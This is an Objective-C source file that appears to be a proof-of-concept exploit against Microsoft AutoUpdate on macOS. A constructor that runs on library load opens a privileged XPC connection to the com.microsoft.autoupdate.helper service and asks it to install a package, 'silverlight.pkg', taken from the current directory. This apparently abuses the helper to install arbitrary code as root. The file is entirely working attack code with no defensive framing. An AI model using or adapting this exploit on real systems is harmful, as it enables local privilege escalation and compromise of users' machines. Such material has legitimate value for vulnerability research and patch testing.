#import <Foundation/Foundation.h>

@protocol MAUHelperToolProtocol
- (void)installUpdateWithPackage:(NSString *)arg1
                     withXMLPath:(NSString *)arg2
                       withReply:(void (^)(NSString *))arg3;

- (void)logString:(NSString *)arg1
          atLevel:(int)arg2
      fromAppName:(NSString *)arg3;
@end

__attribute__((constructor)) void run() {
  NSString *package = [[[[NSFileManager alloc] init] currentDirectoryPath]
      stringByAppendingPathComponent:@"silverlight.pkg"];
  NSXPCConnection *connection = [[NSXPCConnection alloc]
      initWithMachServiceName:@"com.microsoft.autoupdate.helper"
                      options:NSXPCConnectionPrivileged];

  connection.remoteObjectInterface =
      [NSXPCInterface interfaceWithProtocol:@protocol(MAUHelperToolProtocol)];
  dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
  [connection resume];
  [connection.remoteObjectProxy
      installUpdateWithPackage:package
                   withXMLPath:nil
                     withReply:^(NSString *result) {
                       NSLog(@"response: %@", result);
                       dispatch_semaphore_signal(semaphore);
                     }];

  connection.invalidationHandler = connection.interruptionHandler = ^{
    NSLog(@"bye");
    dispatch_semaphore_signal(semaphore);
  };

  dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
  exit(0);
}
